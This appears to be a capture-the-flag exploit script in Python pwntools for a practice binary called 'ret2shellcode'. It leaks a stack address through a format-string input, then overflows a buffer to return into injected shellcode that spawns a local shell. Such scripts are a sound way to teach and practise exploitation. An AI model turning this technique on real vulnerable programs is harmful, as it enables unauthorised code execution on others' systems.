from pwn import *

elf = context.binary = ELF("./ret2shellcode")

#0x7ffe8885a2a6 -> %10$p
#0x7ffe8885a260

#0x7ffc15d8f026 -> %10$p
#0x7ffc15d8efe0 -> buffer

#0x7ffc15d8f026 - 0x7ffc15d8efe0 = 70


shellcode = asm(shellcraft.sh())


r = process(elf.path)
#r.recv(10)
#r.recvuntil(b"print:")
r.sendline(b"%10$p")
r.recvuntil(b"Tell me something to print: ")

leak = r.recvline()
leak = int(leak,16)
info(f"Leak: {hex(leak)}")

buffer_addr = leak - 70
info(f"Buffer addr: {hex(buffer_addr)}")
#r.recvuntil(b"Now, tell me the magic string:")
pause()

shellcode_addr = buffer_addr + len("welcome to pwn")
r.sendline(b"welcome to pwn"+shellcode.ljust(90,b"A")+p64(shellcode_addr))

r.interactive()
